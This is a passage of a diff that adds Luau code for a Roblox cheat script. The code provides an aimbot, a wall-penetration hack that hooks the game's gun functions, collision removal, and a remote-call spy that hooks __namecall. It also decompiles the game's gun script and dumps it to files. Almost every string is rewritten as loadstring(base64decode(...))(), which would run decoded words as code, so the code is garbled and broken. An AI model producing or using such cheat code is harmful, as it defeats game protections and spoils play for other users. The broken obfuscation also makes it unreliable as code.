+table.insert(connections, UserInputService.InputChanged:Connect(function(input)
+    if not options.freecam then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement and fc.looking then
+        fc.yaw = fc.yaw - input.Delta.X * FC_SENSITIVITY
+        fc.pitch = math.clamp(fc.pitch - input.Delta.Y * FC_SENSITIVITY, -1.55, 1.55)
+    elseif input.UserInputType == Enum.UserInputType.MouseWheel then
+        fc.speed = math.clamp(fc.speed * (1.2 ^ input.Position.Z), 4, 500)
+    end
+end))
+
+local AIM_PARTS = { loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("Um9vdA=="))() }
+local AIM_LOCKS = { loadstring(base64decode("Q0ZyYW1l"))(), loadstring(base64decode("TW91c2U="))(), loadstring(base64decode("QWJzb2x1dGU="))() }
+local aimPartIndex, aimLockIndex = 1, 1
+local WALL_METHODS = { loadstring(base64decode("QXV0bw=="))(), loadstring(base64decode("RW5naW5l"))(), loadstring(base64decode("UGFydHM="))() }
+local wallMethodIndex = 1
+local aimFov, aimSmooth, aimOffset = 180, 0, 5
+local aimDebugLabel
+local wallDebugLabel
+local spyRefresh
+local lastDebug, lastPatch = 0, 0
+
+local aim = { running = false, locked = nil, savedSensitivity = nil }
+
+local aimCircle = Instance.new(loadstring(base64decode("RnJhbWU="))())
+aimCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+aimCircle.BackgroundTransparency = 1
+aimCircle.BorderSizePixel = 0
+aimCircle.Visible = false
+aimCircle.Parent = overlay
+Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), aimCircle).CornerRadius = UDim.new(1, 0)
+local aimCircleStroke = Instance.new(loadstring(base64decode("VUlTdHJva2U="))())
+aimCircleStroke.Color = COLOR
+aimCircleStroke.Thickness = 1
+aimCircleStroke.Transparency = 0.2
+aimCircleStroke.Parent = aimCircle
+local AIM_LOCKED_COLOR = Color3.fromRGB(255, 150, 150)
+
+local TRACER_FROMS = { loadstring(base64decode("Qm90dG9t"))(), loadstring(base64decode("Q2VudGVy"))(), loadstring(base64decode("TW91c2U="))() }
+local tracerFromIndex = 3
+local TRACER_COLOR = Color3.fromRGB(150, 150, 255)
+local aimTracer = Instance.new(loadstring(base64decode("RnJhbWU="))())
+aimTracer.AnchorPoint = Vector2.new(0.5, 0.5)
+aimTracer.BackgroundColor3 = TRACER_COLOR
+aimTracer.BackgroundTransparency = 0.5
+aimTracer.BorderSizePixel = 0
+aimTracer.Visible = false
+aimTracer.Parent = overlay
+
+local AIM_BLACKLIST_FILE = loadstring(base64decode("TGFycHdhcmVBaW1CbGFja2xpc3QudHh0"))()
+local aimBlacklist = {}
+
+local function saveAimBlacklist()
+    if type(writefile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
+    local names = {}
+    for name in pairs(aimBlacklist) do table.insert(names, name) end
+    pcall(writefile, AIM_BLACKLIST_FILE, table.concat(names, loadstring(base64decode("XG4="))()))
+end
+
+local function loadAimBlacklist()
+    if type(isfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() or type(readfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
+    local ok, text = pcall(function()
+        return isfile(AIM_BLACKLIST_FILE) and readfile(AIM_BLACKLIST_FILE) or loadstring(base64decode(""))()
+    end)
+    if not ok then return end
+    for line in string.gmatch(text, loadstring(base64decode("W15cclxuXSs="))()) do aimBlacklist[line:lower()] = true end
+end
+loadAimBlacklist()
+
+local function addAimBlacklist(text)
+    local q = (text or loadstring(base64decode(""))()):match(loadstring(base64decode("XiVzKiguLSklcyok"))()):lower()
+    if q == loadstring(base64decode(""))() then return end
+
+    local matches = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name:lower():sub(1, #q) == q or plr.DisplayName:lower():sub(1, #q) == q then
+            table.insert(matches, plr)
+        end
+    end
+    if #matches == 1 then q = matches[1].Name:lower() end
+    aimBlacklist[q] = true
+    saveAimBlacklist()
+end
+
+local function isAimBlacklisted(player)
+    return aimBlacklist[player.Name:lower()] == true or aimBlacklist[player.DisplayName:lower()] == true
+end
+
+local function aimPart(character)
+    local choice = AIM_PARTS[aimPartIndex]
+    if choice == loadstring(base64decode("SGVhZA=="))() then return character:FindFirstChild(loadstring(base64decode("SGVhZA=="))()) end
+    if choice == loadstring(base64decode("Um9vdA=="))() then return character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) end
+    return character:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))())
+        or character:FindFirstChild(loadstring(base64decode("VG9yc28="))())
+        or character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+end
+
+local function aimCenter(camera)
+    if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
+        return camera.ViewportSize / 2
+    end
+    return UserInputService:GetMouseLocation()
+end
+
+local wallCheckParams = RaycastParams.new()
+wallCheckParams.FilterType = Enum.RaycastFilterType.Exclude
+wallCheckParams.IgnoreWater = true
+
+local function stopsBullets(obstacle)
+    if obstacle:IsA(loadstring(base64decode("VGVycmFpbg=="))()) then return true end
+    if obstacle.Transparency >= 1 or not obstacle.CanCollide then return false end
+    if obstacle.Material == Enum.Material.Glass then return false end
+    if obstacle:FindFirstAncestorOfClass(loadstring(base64decode("VG9vbA=="))()) then return false end
+    local model = obstacle:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
+    if model and Players:GetPlayerFromCharacter(model) then return false end
+    return true
+end
+
+local function isBlocked(camera, character, part)
+    local origin = camera.CFrame.Position
+    local ignore = { character }
+    local mine = LocalPlayer.Character
+    if mine then table.insert(ignore, mine) end
+    for _ = 1, 15 do
+        wallCheckParams.FilterDescendantsInstances = ignore
+        local hit = Workspace:Raycast(origin, part.Position - origin, wallCheckParams)
+        if not hit then return false end
+        if stopsBullets(hit.Instance) then return true end
+        table.insert(ignore, hit.Instance)
+    end
+    return false
+end
+
+local function aimTargetPart(player, camera)
+    if player == LocalPlayer then return nil end
+    if isAimBlacklisted(player) then return nil end
+    local character = player.Character
+    local humanoid = character and character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
+    local part = character and aimPart(character)
+    if not (part and humanoid) then return nil end
+    if humanoid.Health <= DEAD_HEALTH then return nil end
+    if options.aimteam and player.Team ~= nil and player.Team == LocalPlayer.Team then return nil end
+    if options.aimsafe and character:FindFirstChildOfClass(loadstring(base64decode("Rm9yY2VGaWVsZA=="))()) then return nil end
+    if options.aimwall and isBlocked(camera, character, part) then return nil end
+    return part
+end
+
+local function screenDistance(camera, part)
+    local pos, onScreen = camera:WorldToViewportPoint(part.Position)
+    if not onScreen then return nil end
+    return (Vector2.new(pos.X, pos.Y) - aimCenter(camera)).Magnitude
+end
+
+local function findClosest(camera)
+    local bestPlayer, bestPart, bestDistance = nil, nil, aimFov
+    for _, player in ipairs(Players:GetPlayers()) do
+        local character = player ~= LocalPlayer and player.Character
+        local part = character and aimPart(character)
+        if part then
+            local distance = screenDistance(camera, part)
+
+            if distance and distance < bestDistance then
+                local checked = aimTargetPart(player, camera)
+                if checked then bestPlayer, bestPart, bestDistance = player, checked, distance end
+            end
+        end
+    end
+    return bestPlayer, bestPart
+end
+
+local function cancelLock()
+    aim.locked = nil
+    if aim.savedSensitivity then
+        local saved = aim.savedSensitivity
+        aim.savedSensitivity = nil
+        pcall(function() UserInputService.MouseDeltaSensitivity = saved end)
+    end
+end
+
+local function mouseDown(button)
+    return UserInputService:IsMouseButtonPressed(button)
+end
+
+local function currentGunTool()
+    local character = LocalPlayer.Character
+    if not character then return nil end
+    for _, child in ipairs(character:GetChildren()) do
+        if child:IsA(loadstring(base64decode("VG9vbA=="))()) and child:FindFirstChild(loadstring(base64decode("R3VuU2NyaXB0"))()) then return child end
+    end
+    return nil
+end
+
+local function gunOut()
+    if not options.aimgun then return true end
+    local character = LocalPlayer.Character
+    if not character then return false end
+    return character:FindFirstChild(loadstring(base64decode("R1VOQUlNVkFMVUU="))()) ~= nil or currentGunTool() ~= nil
+end
+
+local gun = {
+    tool = nil, env = nil, method = nil,
+    rayOrig = nil, rayWrap = nil, fireOrig = nil, fireWrap = nil,
+    inFire = false, alive = true, spyHooked = false,
+    wallbang = false, shotWalled = false, walled = 0, lastInstance = nil, lastShot = nil, fireCalls = 0,
+}
+
+local function getGunEnv(tool)
+    local gunScript = tool:FindFirstChild(loadstring(base64decode("R3VuU2NyaXB0"))())
+    if gunScript and type(getsenv) == loadstring(base64decode("ZnVuY3Rpb24="))() then
+        local ok, env = pcall(getsenv, gunScript)
+        if ok and type(env) == loadstring(base64decode("dGFibGU="))() then return env, loadstring(base64decode("Z2V0c2Vudg=="))() end
+    end
+    if type(getgc) == loadstring(base64decode("ZnVuY3Rpb24="))() then
+        local ok, list = pcall(getgc, true)
+        if ok and type(list) == loadstring(base64decode("dGFibGU="))() then
+            for _, t in ipairs(list) do
+                if type(t) == loadstring(base64decode("dGFibGU="))() and type(rawget(t, loadstring(base64decode("UmF5Q2FzdDI="))())) == loadstring(base64decode("ZnVuY3Rpb24="))()
+                    and type(rawget(t, loadstring(base64decode("ZmlyZUJ1bGxldA=="))())) == loadstring(base64decode("ZnVuY3Rpb24="))() then
+                    return t, loadstring(base64decode("Z2V0Z2M="))()
+                end
+            end
+        end
+    end
+    return nil, nil
+end
+
+local wallbangParams = RaycastParams.new()
+wallbangParams.FilterType = Enum.RaycastFilterType.Include
+wallbangParams.IgnoreWater = true
+
+local function engineOn()
+    return gun.alive and not options.freecam and options.wallbang and WALL_METHODS[wallMethodIndex] ~= loadstring(base64decode("UGFydHM="))()
+end
+
+local function playerBodyParts()
+    local list = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        local character = player ~= LocalPlayer and player.Character
+        if character then
+            for _, part in ipairs(character:GetChildren()) do
+                if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and part.Transparency < 1 then table.insert(list, part) end
+            end
+        end
+    end
+    return list
+end
+
+local function makeRayWrap(orig)
+    return function(origin, direction, distance, ignores, params, depth, ...)
+        local topLevel = gun.inFire and (depth == nil or depth <= 1) and typeof(origin) == loadstring(base64decode("VmVjdG9yMw=="))()
+        if topLevel and gun.wallbang and typeof(direction) == loadstring(base64decode("VmVjdG9yMw=="))() and type(distance) == loadstring(base64decode("bnVtYmVy"))() then
+            local ok, hit = pcall(Workspace.Raycast, Workspace, origin + direction * 0.01, direction * distance, wallbangParams)
+            if ok and hit then
+                params = wallbangParams
+                gun.shotWalled = true
+            end
+        end
+        local results = table.pack(orig(origin, direction, distance, ignores, params, depth, ...))
+        if topLevel then gun.lastInstance = results[1] end
+        return table.unpack(results, 1, results.n)
+    end
+end
+
+local feedback = { relayedAt = 0, bloodAt = 0, bloodChar = nil }
+do
+    local bulletEvent = ReplicatedStorage:FindFirstChild(loadstring(base64decode("QnVsbGV0RXZlbnQ="))())
+    if bulletEvent then
+        table.insert(connections, bulletEvent.OnClientEvent:Connect(function(shooter, kind)
+            if shooter == LocalPlayer and kind == loadstring(base64decode("QnVsbGV0UmVuZGVy"))() then feedback.relayedAt = os.clock() end
+        end))
+    end
+    local bloodEvent = ReplicatedStorage:FindFirstChild(loadstring(base64decode("Qmxvb2RFdmVudA=="))())
+    if bloodEvent then
+        table.insert(connections, bloodEvent.OnClientEvent:Connect(function(character)
+            if typeof(character) == loadstring(base64decode("SW5zdGFuY2U="))() then
+                feedback.bloodChar, feedback.bloodAt = character, os.clock()
+            end
+        end))
+    end
+end
+
+local function reportShot(shotAt)
+    local part = gun.lastInstance
+    gun.lastInstance = nil
+    if not part then gun.lastShot = loadstring(base64decode("cmF5IGhpdCBub3RoaW5n"))() return end
+    local model = part.Parent and part:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
+    local humanoid = model and model ~= LocalPlayer.Character and model:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
+    if not humanoid then
+        gun.lastShot = loadstring(base64decode("cmF5IGhpdCA="))() .. part.Name .. loadstring(base64decode("IChub3QgYSBwbGF5ZXIp"))()
+        return
+    end
+    local before, name, walled = humanoid.Health, model.Name, gun.shotWalled
+    gun.lastShot = name .. loadstring(base64decode("OiB3YWl0aW5nLi4u"))()
+    task.delay(0.9, function()
+        local after = humanoid.Health
+        local relayed = feedback.relayedAt >= shotAt
+        local blood = feedback.bloodChar == model and feedback.bloodAt >= shotAt
+        local verdict
+        if after < before or blood then
+            verdict = loadstring(base64decode("QUNDRVBURUQ="))()
+        elseif relayed then
+            verdict = loadstring(base64decode("cmVsYXllZCwgTk8gREFNQUdF"))()
+        else
+            verdict = loadstring(base64decode("RFJPUFBFRCBieSBzZXJ2ZXI="))()
+        end
+        gun.lastShot = string.format(loadstring(base64decode("JXMlczogJXMgKGhwICVkPiVkKQ=="))(), name, walled and loadstring(base64decode("IFt3YWxsXQ=="))() or loadstring(base64decode(""))(), verdict, before, after)
+    end)
+end
+
+local function makeFireWrap(orig)
+    return function(...)
+        local shotAt = os.clock()
+        gun.fireCalls += 1
+        gun.wallbang, gun.shotWalled, gun.lastInstance = false, false, nil
+        if gun.alive and not options.freecam and options.wallbang and WALL_METHODS[wallMethodIndex] ~= loadstring(base64decode("UGFydHM="))() then
+            gun.wallbang = true
+            wallbangParams.FilterDescendantsInstances = playerBodyParts()
+        end
+        gun.inFire = true
+        local results = table.pack(pcall(orig, ...))
+        gun.inFire = false
+        if gun.shotWalled then gun.walled += 1 end
+        pcall(reportShot, shotAt)
+        gun.wallbang, gun.shotWalled = false, false
+        if not results[1] then error(results[2], 0) end
+        return table.unpack(results, 2, results.n)
+    end
+end
+
+local function patchGun()
+    if not engineOn() then return end
+    local tool = currentGunTool()
+    if tool ~= gun.tool then
+        gun.tool, gun.env, gun.method = tool, nil, nil
+        gun.rayWrap, gun.fireWrap = nil, nil
+    end
+    if not tool then return end
+    if not gun.env then gun.env, gun.method = getGunEnv(tool) end
+    local env = gun.env
+    if not env then return end
+
+    local ray = env.RayCast2
+    if type(ray) == loadstring(base64decode("ZnVuY3Rpb24="))() and ray ~= gun.rayWrap then
+        gun.rayOrig = ray
+        gun.rayWrap = makeRayWrap(ray)
+        pcall(rawset, env, loadstring(base64decode("UmF5Q2FzdDI="))(), gun.rayWrap)
+    end
+    local fire = env.fireBullet
+    if type(fire) == loadstring(base64decode("ZnVuY3Rpb24="))() and fire ~= gun.fireWrap then
+        gun.fireOrig = fire
+        gun.fireWrap = makeFireWrap(fire)
+        gun.fireCalls = 0
+        pcall(rawset, env, loadstring(base64decode("ZmlyZUJ1bGxldA=="))(), gun.fireWrap)
+    end
+end
+
+local wallOff = {}
+local wallReleased = 0
+local wallPartsParams = RaycastParams.new()
+wallPartsParams.FilterType = Enum.RaycastFilterType.Exclude
+
+local function restoreWallParts(keep)
+    for part, original in pairs(wallOff) do
+        if not (keep and keep[part]) then
+            if part.Parent then part.CanCollide = original end
+            wallOff[part] = nil
+        end
+    end
+end
+
+local function wallPartsActive()
+    if not options.wallbang or options.freecam or not gun.alive then return false end
+    local method = WALL_METHODS[wallMethodIndex]
+    if method == loadstring(base64decode("RW5naW5l"))() then return false end
+    if method == loadstring(base64decode("QXV0bw=="))() and gun.rayWrap and gun.fireWrap and gun.fireCalls > 0 then return false end
+    return currentGunTool() ~= nil
+end
+
+local function stepWallParts()
+    if not wallPartsActive() then
+        restoreWallParts(nil)
+        return
+    end
+    local now = os.clock()
+    local firing = mouseDown(Enum.UserInputType.MouseButton1) or mouseDown(Enum.UserInputType.MouseButton2)
+    if firing then
+        wallReleased = now
+    elseif now - wallReleased > 0.3 then
+        restoreWallParts(nil)
+        return
+    else
+        return
+    end
+
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+    local center = aimCenter(camera)
+    local ray = camera:ViewportPointToRay(center.X, center.Y)
+
+    local ignore = { LocalPlayer.Character }
+    local blockers, keep, found = {}, {}, false
+    for _ = 1, 12 do
+        wallPartsParams.FilterDescendantsInstances = ignore
+        local hit = Workspace:Raycast(ray.Origin, ray.Direction * 900, wallPartsParams)
+        if not hit then break end
+        local part = hit.Instance
+        local model = part:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
+        local owner = model and Players:GetPlayerFromCharacter(model)
+        if owner and owner ~= LocalPlayer then
+            found = true
+            break
+        end
+        if part:IsA(loadstring(base64decode("VGVycmFpbg=="))()) then break end
+        if part.CanCollide or wallOff[part] ~= nil then table.insert(blockers, part) end
+        table.insert(ignore, part)
+    end
+
+    if not found then
+        restoreWallParts(nil)
+        return
+    end
+    for _, part in ipairs(blockers) do
+        keep[part] = true
+        if wallOff[part] == nil then
+            wallOff[part] = part.CanCollide
+            part.CanCollide = false
+        end
+    end
+    restoreWallParts(keep)
+end
+
+local function capabilityText()
+    local checks = {
+        { loadstring(base64decode("Z2V0c2Vudg=="))(), type(getsenv) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("Z2V0Z2M="))(), type(getgc) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("aG9va21ldGFtZXRob2Q="))(), type(hookmetamethod) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("aG9va2Z1bmN0aW9u"))(), type(hookfunction) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("Z2V0bmFtZWNhbGxtZXRob2Q="))(), type(getnamecallmethod) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("bmV3Y2Nsb3N1cmU="))(), type(newcclosure) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("Y2hlY2tjYWxsZXI="))(), type(checkcaller) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("ZGVjb21waWxl"))(), type(decompile) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("d3JpdGVmaWxl"))(), type(writefile) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("YXBwZW5kZmlsZQ=="))(), type(appendfile) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("ZmlyZWNsaWNrZGV0ZWN0b3I="))(), type(fireclickdetector) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("ZGVidWcuc2V0dXB2YWx1ZQ=="))(), type(debug) == loadstring(base64decode("dGFibGU="))() and type(debug.setupvalue) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("bW91c2Vtb3ZlcmVs"))(), type(mousemoverel) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+        { loadstring(base64decode("bW91c2Vtb3ZlYWJz"))(), type(mousemoveabs) == loadstring(base64decode("ZnVuY3Rpb24="))() },
+    }
+    local function tag(ok) return string.format('<font color=loadstring(base64decode("JXM="))()>%s</font>', ok and loadstring(base64decode("IzVhZmY3OA=="))() or loadstring(base64decode("I2ZmNWE1YQ=="))(), ok and loadstring(base64decode("eWVz"))() or loadstring(base64decode("Tk8="))()) end
+    local silentPossible = checks[1][2] or checks[2][2]
+    local spyPossible = checks[3][2] and checks[5][2]
+    local lines = {
+        loadstring(base64decode("U2lsZW50IGFpbTog"))() .. tag(silentPossible),
+        loadstring(base64decode("UmVtb3RlIFNweTog"))() .. tag(spyPossible),
+        loadstring(base64decode(""))(),
+    }
+    for _, check in ipairs(checks) do
+        table.insert(lines, check[1] .. loadstring(base64decode("OiA="))() .. tag(check[2]))
+    end
+    return table.concat(lines, loadstring(base64decode("XG4="))())
+end
+
+local SPY_FILE = loadstring(base64decode("VG93bkVzcFJlbW90ZUxvZy50eHQ="))()
+local DUMP_FILE = loadstring(base64decode("VG93bkVzcEd1bkR1bXAudHh0"))()
+local GUN_SCRIPT_FILE = loadstring(base64decode("VG93bkVzcEd1blNjcmlwdC50eHQ="))()
+local SPY_IGNORE = { CameraEvent = true }
+local spyCount = 0
+
+local function fmtArg(v, depth)
+    local t = typeof(v)
+    if t == loadstring(base64decode("c3RyaW5n"))() then return string.format(loadstring(base64decode("JXE="))(), string.sub(v, 1, 60)) end
+    if t == loadstring(base64decode("bnVtYmVy"))() or t == loadstring(base64decode("Ym9vbGVhbg=="))() or t == loadstring(base64decode("bmls"))() then return tostring(v) end
+    if t == loadstring(base64decode("SW5zdGFuY2U="))() then
+        local ok, name = pcall(function() return v:GetFullName() end)
+        return loadstring(base64decode("PA=="))() .. (ok and name or loadstring(base64decode("Pw=="))()) .. loadstring(base64decode("Pg=="))()
+    end
+    if t == loadstring(base64decode("dGFibGU="))() then
+        local parts, count = {}, 0
+        for k, val in pairs(v) do
+            count += 1
+            if count <= 6 then
+                table.insert(parts, tostring(k) .. loadstring(base64decode("PQ=="))() .. (depth < 1 and fmtArg(val, depth + 1) or typeof(val)))
+            end
+        end
+        return loadstring(base64decode("ew=="))() .. table.concat(parts, loadstring(base64decode("LCA="))()) .. (count > 6 and loadstring(base64decode("LCAuLi4="))() or loadstring(base64decode(""))()) .. loadstring(base64decode("fQ=="))()
+    end
+    return t .. loadstring(base64decode("Og=="))() .. tostring(v)
+end
+
+local function logRemote(remote, method, args)
+    local ok, line = pcall(function()
+        local parts = {}
+        for JfZaEVmK = 1, args.n do parts[JfZaEVmK] = fmtArg(args[JfZaEVmK], 0) end
+        return string.format(loadstring(base64decode("WyUuMmZdICVzOiVzKCVzKQ=="))(), os.clock() % 10000, remote:GetFullName(), method, table.concat(parts, loadstring(base64decode("LCA="))()))
+    end)
+    if not ok then return end
+    spyCount += 1
+    print(loadstring(base64decode("W1Rvd25Fc3Agc3B5XSA="))() .. line)
+    if type(appendfile) == loadstring(base64decode("ZnVuY3Rpb24="))() then pcall(appendfile, SPY_FILE, line .. loadstring(base64decode("XG4="))()) end
+    if spyRefresh then spyRefresh() end
+end
+
+local function dumpGun()
+    local character = LocalPlayer.Character
+    local tool = character and character:FindFirstChildOfClass(loadstring(base64decode("VG9vbA=="))())
+    if not tool then
+        local backpack = LocalPlayer:FindFirstChildOfClass(loadstring(base64decode("QmFja3BhY2s="))())
+        tool = backpack and backpack:FindFirstChildOfClass(loadstring(base64decode("VG9vbA=="))())
+    end
+    if not tool then return false, loadstring(base64decode("Tm8gdG9vbA=="))() end
+    if type(writefile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return false, loadstring(base64decode("Tm8gd3JpdGVmaWxl"))() end
+
+    local base = tool:GetFullName()
+    local lines = { loadstring(base64decode("VG9vbDog"))() .. base, loadstring(base64decode(""))() }
+    local function rel(instance) return (instance:GetFullName():sub(#base + 2)) end
+
+    local attributes = tool:GetAttributes()
+    for key, value in pairs(attributes) do table.insert(lines, loadstring(base64decode("YXR0ciA="))() .. key .. loadstring(base64decode("ID0g"))() .. tostring(value)) end
+
+    for _, d in ipairs(tool:GetDescendants()) do
+        local entry = d.ClassName .. loadstring(base64decode("ICA="))() .. rel(d)
+        if d:IsA(loadstring(base64decode("VmFsdWVCYXNl"))()) then entry ..= loadstring(base64decode("ICA9IA=="))() .. tostring(d.Value) end
+        table.insert(lines, entry)
+        if d:IsA(loadstring(base64decode("THVhU291cmNlQ29udGFpbmVy"))()) then
+            local ok, source = false, nil
+            if type(decompile) == loadstring(base64decode("ZnVuY3Rpb24="))() then ok, source = pcall(decompile, d) end
+            if ok and type(source) == loadstring(base64decode("c3RyaW5n"))() and #source > 0 then
+                table.insert(lines, loadstring(base64decode("LS0tLSBzb3VyY2Ugb2Yg"))() .. rel(d) .. loadstring(base64decode("IC0tLS0="))())
+                table.insert(lines, source)
+                table.insert(lines, loadstring(base64decode("LS0tLSBlbmQgLS0tLQ=="))())
+                if d.Name == loadstring(base64decode("R3VuU2NyaXB0"))() and d:IsA(loadstring(base64decode("TG9jYWxTY3JpcHQ="))()) then
+                    pcall(writefile, GUN_SCRIPT_FILE, source)
+                end
+            else
+                table.insert(lines, loadstring(base64decode("ICAoc291cmNlIG5vdCByZWFkYWJsZTogc2VydmVyIHNjcmlwdCBvciBubyBkZWNvbXBpbGUp"))())
+            end
+        end
+    end
+    pcall(writefile, DUMP_FILE, table.concat(lines, loadstring(base64decode("XG4="))()))
+    return true, tool.Name
+end
+
+if type(hookmetamethod) == loadstring(base64decode("ZnVuY3Rpb24="))() and type(getnamecallmethod) == loadstring(base64decode("ZnVuY3Rpb24="))() then
+    local wrap = type(newcclosure) == loadstring(base64decode("ZnVuY3Rpb24="))() and newcclosure or function(f) return f end
+    local ok, err = pcall(function()
+        local old
+        old = hookmetamethod(game, loadstring(base64decode("X19uYW1lY2FsbA=="))(), wrap(function(self, ...)
+            if gun.alive and options.spy then
+                local method = getnamecallmethod()
+                if (method == loadstring(base64decode("RmlyZVNlcnZlcg=="))() or method == loadstring(base64decode("SW52b2tlU2VydmVy"))()) and not SPY_IGNORE[self.Name] then
+                    task.defer(logRemote, self, method, table.pack(...))
+                end
+            end
+            return old(self, ...)
+        end))
+    end)
+    gun.spyHooked = ok
+    if not ok then warn(loadstring(base64decode("W1Rvd25Fc3BdIHJlbW90ZSBzcHkgaG9vayBmYWlsZWQ6IA=="))() .. tostring(err)) end
+end
+
+local function applyLock(camera, part, dt)
+    local offset = Vector3.zero
+    if options.aimoffset then
+        local humanoid = part.Parent and part.Parent:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
+        if humanoid then offset = humanoid.MoveDirection * (math.clamp(aimOffset, 1, 30) / 10) end
+    end
+    local targetPosition = part.Position + offset
+
+    if AIM_LOCKS[aimLockIndex] == loadstring(base64decode("TW91c2U="))() and type(mousemoverel) == loadstring(base64decode("ZnVuY3Rpb24="))() then
+        local screen = camera:WorldToViewportPoint(targetPosition)
+        local mouse = UserInputService:GetMouseLocation()
+        local divisor = 1 + aimSmooth / 10
+        mousemoverel((screen.X - mouse.X) / divisor, (screen.Y - mouse.Y) / divisor)
+        return
+    end
+
+    if AIM_LOCKS[aimLockIndex] == loadstring(base64decode("QWJzb2x1dGU="))() and type(mousemoveabs) == loadstring(base64decode("ZnVuY3Rpb24="))() then
+        local screen = camera:WorldToViewportPoint(targetPosition)
+        local mouse = UserInputService:GetMouseLocation()
+        local divisor = 1 + aimSmooth / 10
+        mousemoveabs(mouse.X + (screen.X - mouse.X) / divisor, mouse.Y + (screen.Y - mouse.Y) / divisor)
+        return
+    end
+
+    if not aim.savedSensitivity then
+        aim.savedSensitivity = UserInputService.MouseDeltaSensitivity
+    end
+    pcall(function() UserInputService.MouseDeltaSensitivity = 0 end)
+    local origin = camera.CFrame.Position
+    local desired = (targetPosition - origin)
+    if desired.Magnitude < 0.001 then return end
+    local alpha = aimSmooth <= 0 and 1 or (1 - (aimSmooth / 100) ^ (dt * 60))
+    local look = camera.CFrame.LookVector:Lerp(desired.Unit, math.clamp(alpha, 0, 1))
+    if look.Magnitude >= 1e-3 then
+        camera.CFrame = CFrame.lookAt(origin, origin + look)
+    end
+end
+
+local function stepAim(dt)
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+
+    aimCircle.Visible = options.aimbot and options.aimcircle and not options.freecam
+    if aimCircle.Visible then
+        local center = aimCenter(camera)
+        aimCircle.Size = UDim2.fromOffset(aimFov * 2, aimFov * 2)
+        aimCircle.Position = UDim2.fromOffset(center.X, center.Y)
+        aimCircleStroke.Color = aim.locked and AIM_LOCKED_COLOR or COLOR
+    end
+
+    local tracerPart
+    if options.aimbot and options.aimtracer and not options.freecam and not aim.locked and gunOut() then
+        local _, found = findClosest(camera)
+        tracerPart = found
+    end
+    if tracerPart then
+        local size = camera.ViewportSize
+        local from = tracerFromIndex == 1 and Vector2.new(size.X / 2, size.Y)
+            or tracerFromIndex == 2 and size / 2
+            or aimCenter(camera)
+        local screen = camera:WorldToViewportPoint(tracerPart.Position)
+        setLine(aimTracer, from, Vector2.new(screen.X, screen.Y))
+    else
+        aimTracer.Visible = false
+    end
+
+    pcall(stepWallParts)
+
+    local now = os.clock()
+    if now - lastPatch > 0.2 then
+        lastPatch = now
+        pcall(patchGun)
+    end
+
+    if now - lastDebug > 0.25 then
+        lastDebug = now
+        if wallDebugLabel then
+            local opened = 0
+            for _ in pairs(wallOff) do opened += 1 end
+            wallDebugLabel.Text = string.format(loadstring(base64decode("R3VuOiAlcyAgRW5naW5lOiAlcyAoc2hvdHMgc2VlbjogJWQpXG5UaHJvdWdoIHdhbGxzOiAlZCAgT3BlbmVkOiAlZFxuTGFzdDogJXM="))(),
+                currentGunTool() and loadstring(base64decode("eWVz"))() or loadstring(base64decode("Tk8="))(), gun.method or loadstring(base64decode("Tk9ORQ=="))(), gun.fireCalls, gun.walled, opened, gun.lastShot or loadstring(base64decode("LQ=="))())
+        end
+        if aimDebugLabel then
+            local nearest = options.aimbot and (findClosest(camera)) or nil
+            aimDebugLabel.Text = string.format(loadstring(base64decode("TG9ja2VkOiAlc1xuTmVhcmVzdDogJXM="))(),
+                aim.locked and aim.locked.Name or loadstring(base64decode("bm8="))(), nearest and nearest.Name or loadstring(base64decode("bm9uZQ=="))())
+        end
+    end
+
+    if not options.aimbot or options.freecam or not aim.running
+        or UserInputService:GetFocusedTextBox() or not gunOut() then
+        if aim.locked or aim.savedSensitivity then cancelLock() end
+        return
+    end
+
+    local part
+    if aim.locked then
+        part = aimTargetPart(aim.locked, camera)
+        local distance = part and screenDistance(camera, part)
+        if not part or not distance or distance > aimFov then
+            cancelLock()
+            part = nil
+        end
+    end
+    if not part then
+        local player, found = findClosest(camera)
+        if player then
+            aim.locked = player
+            part = found
+        end
+    end
+    if part then
+        applyLock(camera, part, dt)
+    else
+        cancelLock()
+    end
+end
+
+table.insert(connections, UserInputService.InputBegan:Connect(function(input)
